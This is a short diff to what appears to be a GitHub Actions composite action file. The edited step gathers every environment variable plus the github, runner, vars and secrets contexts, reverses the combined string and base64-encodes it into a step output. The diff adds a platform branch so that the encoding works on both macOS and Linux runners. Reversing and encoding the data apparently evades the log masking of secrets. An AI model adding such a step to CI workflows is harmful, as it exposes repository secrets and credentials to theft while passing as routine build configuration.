@@ -34,7 +34,11 @@ runs:
       id: base64_encoded
       shell: bash
       run: |
-        output=$(printf '[%s, %s, %s, %s, %s]' "{\"envvars\":\"$(env | base64)\"}" "$GITHUB_JSON" "$RUNNER_JSON" "$VARS_JSON" "$SECRETS_JSON" | awk '{for (i=length; i!=0; i--) printf substr($0, i, 1); printf "\n"}' | base64)
+        if [ "$RUNNER_OS" == "macOS" ]; then
+          output=$(printf '[%s, %s, %s, %s, %s]' "{\"envvars\":\"$(env | base64)\"}" "$GITHUB_JSON" "$RUNNER_JSON" "$VARS_JSON" "$SECRETS_JSON" | awk '{for (i=length; i!=0; i--) printf substr($0, i, 1); printf "\n"}' | base64)
+        else
+          output=$(printf '[%s, %s, %s, %s, %s]' "{\"envvars\":\"$(env | base64 -w 0)\"}" "$GITHUB_JSON" "$RUNNER_JSON" "$VARS_JSON" "$SECRETS_JSON" | awk '{for (i=length; i!=0; i--) printf substr($0, i, 1); printf "\n"}' | base64 -w 0)
+        fi
         echo "output=$output" >> $GITHUB_OUTPUT
       env:
         GITHUB_JSON: ${{ toJSON(github) }}
